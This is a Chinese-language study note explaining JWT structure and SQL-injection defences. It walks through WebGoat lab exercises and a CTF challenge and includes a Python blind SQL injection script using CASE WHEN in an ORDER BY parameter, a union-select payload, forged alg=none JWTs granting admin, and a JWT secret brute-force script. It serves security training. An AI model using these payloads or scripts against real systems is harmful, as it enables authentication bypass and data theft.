

[TOC]



## 思维导图

### Java应用

![](image40/java应用.png)

### JWT

![](image40/JWT.png)



![](image40/jwt_token.png)



### 什么是 JWT？

JSON Web Token（JSON Web 令牌）是一种跨域验证身份的方案。JWT 不加密传输的数据，但能够通
过数字签名来验证数据未被篡改（但是做完下面的 WebGoat 练习后我对这一点表示怀疑）。

JWT 分为三部分，头部（Header），声明（Claims），签名（Signature），三个部分以英文句号.隔开。
JWT 的内容以 Base64URL 进行了编码。

#### 头部 （Header）

```json
（Header）
{
"alg":"HS256",
"typ":"JWT"
}
```

alg
是说明这个JWT 的签名使用的算法的参数，常见值用HS256（默认），HS512 等，也可以为None。HS256
表示 HMAC SHA256。
typ
说明这个 token 的类型为 JWT

#### 声明（Claims）

```json
（Claims）
{
"exp": 1416471934,
"user_name": "user",
"scope": [
"read",
"write"
],
"authorities": [
"ROLE_ADMIN",
"ROLE_USER"
],
"jti": "9bc92a44-0b1a-4c5e-be70-da52075b9a84",
"client_id": "my-client-with-secret"
}
```

#### JWT 固定参数有：

- iss：发行人
- exp：到期时间
- sub：主题
- aud：用户
- nbf：在此之前不可用
- iat：发布时间
- jti：JWT ID 用于标识该 JWT

#### 签名（Signature）

（Signature）
服务器有一个不会发送给客户端的密码（secret），用头部中指定的算法对头部和声明的内容用此密
码进行加密，生成的字符串就是 JWT 的签名。
下面是一个用 HS256 生成 JWT 的代码例子

```txt
HMACSHA256(base64UrlEncode(header) + "." + base64UrlEncode(payload),secret)
```



### 身份验证和获取JWT令牌

#### 获取令牌的基本顺序如下：

![](image40/jwt_diagram.png)

1、用户端登录，用户名和密码在请求中被发往服务器
2、（确认登录信息正确后）服务器生成 JSON 头部和声明，将登录信息写入 JSON 的声明中（通常不
应写入密码，因为 JWT 是不加密的），并用 secret 用指定算法进行加密，生成该用户的 JWT。此时，
服务器并没有保存登录状态信息。
3、服务器将 JWT（通过响应）返回给客户端
4、用户下次会话时，客户端会自动将 JWT 写在 HTTP 请求头部的 Authorization 字段中
5、服务器对 JWT 进行验证，若验证成功，则确认此用户的登录状态
6、服务器返回响应





### SQL Injection(mitigation)

#### 防御 sql 注入，其实就是 session，参数绑定，存储过程这样的注入。

```javascript
// 利用 session 防御，session 内容正常情况下是用户无法修改的 select * from users where user = "'" +
session.getAttribute("UserID") + "'";
// 参数绑定方式，利用了 sql 的预编译技术
String query = "SELECT * FROM users WHERE last_name = ?";
PreparedStatement statement = connection.prepareStatement(query);
statement.setString(1, accountName);
ResultSet results = statement.executeQuery();
```

上面说的方式也不是能够绝对的进行 sql 注入防御，只是减轻。
如参数绑定方式可以使用下面方式绕过。
通过使用 case when 语句可以将 order by 后的 orderExpression 表达式中添加 select 语句。

```python
import requests
from string import digits
chars = digits+"."

data1 ="username_reg=tomx'+union+select+password+from+sql_challenge_users+where+userid%3D'teom'--+-&email_reg=7702%40qq.com&password_reg=123&confirm_password_reg=123"
headers = {
    'X-Requested-With': 'XMLHttpRequest'
}
cookies = {
    'JSESSIONID': 'K52JTW9G7ys_YpyyGOCHCeMxSI4FTEKm4WebtUhF',
    'JSESSIONID.75fbd09e': '7mc1x9iei6ji4xo2a3u4kbz1'
}
i = 0
result = ""
proxy={"http": "http://127.0.0.1:8080"}
while True:
    i += 1
    temp = result
    for char in chars:
        vul_url ="http://localhost:8080/WebGoat/SqlInjectionMitigations/servers?column=case%20when%20(select%20substr(ip,{0},1)='{1}'%20from%20servers%20where%20hostname='webgoat-prd')%20then%20hostname%20else%20mac%20end".format(i, char)
        resp = requests.get(vul_url, headers=headers, cookies=cookies, proxies=proxy)
        # print(resp.json())
        if 'webgoat-acc' in resp.json()[0]['hostname']:
            result += char
            print(result)
        if temp == result:
            break
```





## 演示案例：

### Javaweb-SQL 注入攻击-预编译机制绕过

#了解预编译机制
https://www.cnblogs.com/klyjb/p/11473857.html
https://www.zhihu.com/question/43581628
#参考参数绑定绕过方式 case when 注入

![](image40/QQ截图20220331202612.png)





![](image40/QQ截图20220331203647.png)



点击页面IP排序——>抓包

![](image40/QQ截图20220331204147.png)



发送正常显示

![](image40/QQ截图20220331204251.png)



column=i  爆错——发现数据库名称为 servers

![](image40/QQ截图20220331204323.png)

预编译

使用case when 绕过

更爱cookie后上面的脚本直接跑

![](image40/QQ截图20220331210502.png)

### Javaweb-身份验证攻击-JWT 修改伪造攻击

#了解 JWT 传输过程，验证机制
#了解 JWT 结构，加解密过程及注意事项
注意：
问题来了，因为 JWT 的声明内容变了，因此签名需要重新生成，生成签名又需要密码，我们没有密
码呀？不要慌，我们直接去掉签名就好~修改头部为 None
在 HTTP 传输过程中，Base64 编码中的"=","+","/"等特殊符号通过 URL 解码通常容易产生歧义，因此
产生了与 URL 兼容的 Base64 URL 编码

![](image40/QQ截图20220331210950.png)



![](image40/QQ截图20220331211314.png)



![](image40/QQ截图20220331211404.png)

把alg改为none



![](image40/QQ截图20220331211553.png)

admin改为true

![QQ截图20220331211830](image40/QQ截图20220331211830.png)

Payload:

```
eyJhbGciOiJub25lIn0.ewogICJpYXQiOiAxNjQ5NTk2MzAzLAogICJhZG1pbiI6ICJ0cnVlIiwKICAidXNlciI6ICJUb20iCn0.
```



![QQ截图20220331211942](image40/QQ截图20220331211942.png)









### Javaweb-身份验证attack-JWT密匙爆破attack

```python
import jwt
import json

alg = "HS256"
jwt_str = "eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTY0ODczMzA4MiwiZXhwIjoxNjQ4NzMzMTQyLCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.WxfaEGOXVtxmASeRCqY65Rc0ZWP9XgznQoQtOavUM4U"
with open('pass.txt', encoding='utf-8') as f:
    for line in f:
        key_ = line.strip()
        try:
            jwt.decode(jwt_str, verify=True, key=key_, algorithms="HS256")
            print('found key! --> ' + key_)
            break
        except(jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError,
               jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError,
               jwt.exceptions.ImmatureSignatureError):
            print('found key! --> ' + key_)
            break
        except jwt.exceptions.InvalidSignatureError:
            continue
    else:
        print("key not found!")

```





![](image40/QQ截图20220331212617.png)

![](image40/QQ截图20220331212721.png)

爆破 密匙  ——》 victory

![](image40/QQ截图20220331215301.png)



![](image40/QQ截图20220331220014.png)









### CTF-Node.js-前端jwt登录安全-伪造admin实现getflag



原来jwt

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZWNyZXRpZCI6MCwidXNlcm5hbWUiOiJsaWFuZHkiLCJwYXNzd29yZCI6IjEyMzQ1NiIsImlhdCI6MTY0ODc0MDA1Mn0.kG-SBF8_akEemIxHvTQZNjeIaKJZqmMB2MpL7R7rOTg
```

http://challenge-f032d3bea168a9ea.sandbox.ctfhub.com:10800/controllers/api.js

![](image40/QQ截图20220331233904.png)

构造jwt

![](image40/QQ截图20220331233032.png)

![QQ截图20220331233104](image40/QQ截图20220331233104.png)

构造jwt 

```
ewogICJhbGciOiAibm9uZSIsCiAgInR5cCI6ICJKV1QiCn0.ewogICJzZWNyZXRpZCI6IFtdLAogICJ1c2VybmFtZSI6ICJhZG1pbiIsCiAgInBhc3N3b3JkIjogIjEyMzQ1NiIsCiAgImlhdCI6IDE2NDg3NDAwNTIKfQ.
```



获取到flag

![QQ截图20220331233702](image40/QQ截图20220331233702.png)





## 涉及资源



[JSON Web Tokens - jwt.io](https://jwt.io/#debugger-io)

[JDBC编程之预编译SQL与防注入](https://www.cnblogs.com/klyjb/p/11473857.html)

[JWT安全认证及伪造爆破 ](https://zhuanlan.zhihu.com/p/394138133)

[Java代码审计入门：WebGoat8（再会） - FreeBuf网络安全行业门户](https://www.freebuf.com/vuls/216457.html)

[ webgoat全关教程手册_](https://blog.csdn.net/zy15667076526/article/details/109560492)

[ WebGoat SQL注入之 Order by注入解题思路](https://blog.csdn.net/u013553529/article/details/82765062)